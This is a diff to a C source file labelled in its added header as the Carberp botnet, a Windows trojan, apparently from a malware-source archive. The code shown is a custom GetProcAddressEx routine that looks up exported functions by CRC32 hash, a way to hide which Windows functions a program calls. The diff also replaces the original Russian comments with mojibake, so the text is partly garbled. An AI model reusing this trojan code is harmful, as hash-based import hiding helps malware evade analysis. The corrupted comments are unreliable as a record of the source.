@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "system.h"
 #include "crc32.h"
 #include <shlwapi.h>
@@ -169,19 +180,19 @@ LPVOID GetProcAddressEx(HMODULE lpImg,LPCSTR lpProcName,int dwFlags)
         {
             PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)&buf[poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress];
 
-            //импорт по ординалу
+            //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
             if (!HIWORD(lpProcName))
                 dwOrd=((int)lpProcName & 0xffff)-exp->Base;
             else
             {
                 if (dwFlags & LDR_GET_BY_HASH)
-                    //импорт по хэшу
+                    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
                     func_hash=(int)lpProcName;
                 else
-                    //импорт по имени
+                    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                     func_hash=chksum_crc32((byte *)lpProcName,strlen(lpProcName));
 
-                //импорт по имени
+                //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                 for (u_int i=0; i < exp->NumberOfNames; i++)
                 {
                     byte *s=(byte*)&buf[*(DWORD*)&buf[exp->AddressOfNames+i*sizeof(DWORD)]];
@@ -195,7 +206,7 @@ LPVOID GetProcAddressEx(HMODULE lpImg,LPCSTR lpProcName,int dwFlags)
             lpRet=((dwOrd != -1) ? (LPVOID*)&buf[*(DWORD*)&buf[exp->AddressOfFunctions+dwOrd*sizeof(DWORD)]] : 0);
             if (((ULONG_PTR)lpRet >= (ULONG_PTR)exp) && ((ULONG_PTR)lpRet < (ULONG_PTR)exp+poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size))
             {
-                //в экспорте форвард на другую библиотеку...
+                //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ...
                 char FwName[128];
                 _strcpy(FwName,(char*)lpRet);
                 lpRet=0;
